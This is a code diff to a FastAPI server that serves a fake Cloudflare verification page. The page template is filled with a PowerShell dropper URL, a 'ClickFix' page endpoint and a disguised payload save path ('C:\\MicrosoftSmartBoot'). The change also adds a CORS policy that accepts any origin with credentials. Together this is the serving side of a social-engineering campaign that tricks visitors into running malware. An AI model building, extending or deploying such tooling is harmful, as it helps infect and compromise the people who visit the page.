@@ -4,12 +4,19 @@ from do import DoShit
 import asyncio
 import aiofiles
 import config
+from fastapi.middleware.cors import CORSMiddleware
+
 
 
 
 app = FastAPI()
 
-
+app.add_middleware(CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 
 
@@ -22,7 +29,7 @@ async def root_route(req:Request):
     async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
         html = await f.read()
     html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
-    html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page_endpoint"])
+    html = html.replace('{{CLICK_FIX_PAGE}}',config.conf["URLS"]["clickfix_page_endpoint"])
     html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
     print(html)
     return HTMLResponse(
